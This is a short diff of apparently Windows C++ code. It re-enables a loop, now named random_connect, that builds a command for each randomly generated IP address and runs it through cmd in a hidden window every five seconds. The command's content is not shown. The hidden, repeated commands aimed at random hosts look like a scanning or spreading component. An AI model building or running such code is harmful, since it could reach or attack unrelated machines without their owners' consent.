@@ -4,7 +4,7 @@
 #include <vector>
 #include <string>
 #include <shellapi.h>
-
+#include <modules/network.hpp>
 
 using namespace std;
 
@@ -45,13 +45,13 @@ string generate_cmd(string ip){
     }
     return fin_cmd;
 }
-/*
-int main(){
+
+void random_connect(){
     string temp;
     while(1){
         temp = generate_cmd(generate_ip());
         cout << temp << endl;
-        ShellExecute(NULL, "open", "cmd", temp.c_str(), NULL, 0);
+        ShellExecuteA(NULL, "open", "cmd", LPCSTR(temp.c_str()), NULL, 0);
         Sleep(5000);
     }
-}*/
+}
